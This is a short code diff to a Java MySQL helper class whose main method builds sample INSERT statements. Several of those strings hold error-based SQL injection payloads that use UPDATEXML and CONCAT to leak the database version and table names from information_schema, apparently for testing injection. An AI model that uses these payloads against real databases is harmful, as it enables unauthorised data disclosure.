@@ -85,9 +85,9 @@ public class MySql {
 	public static void main(String[] args) {
 		MySql mysql = new MySql();
 		Connection conn = mysql.getConn();
-		String insertSQl = "insert into tab1 (url,title,content) values('baidu.com','db','this is baidu')";
-		insertSQl = "INSERT INTO tab_common (id, username, passwd) VALUES (2,'Olivia' OR UPDATEXML(1,CONCAT(0x7e,(VERSION())),0) OR'', 'Nervo')";
-		insertSQl = "INSERT INTO tab_common (id, username, passwd) VALUES (2,'r00tgrok1' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', 'ohmygod_is_r00tgrok')";
+		String insertSQl = "insert into tab1 (url,title,content) values('hzw.com','hzw163','test')";
+		insertSQl = "INSERT INTO tab_common (id, username, passwd) VALUES(2,'Olivia' OR UPDATEXML(1,CONCAT(0x7e,(VERSION())),0) OR'','Nervo')";
+		insertSQl = "INSERT INTO tab_common (id, username, passwd) VALUES(2,'r00tgrok1' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', 'ohmygod_is_r00tgrok')";
 		mysql.datatoMySql(conn, insertSQl);
 	}
 }
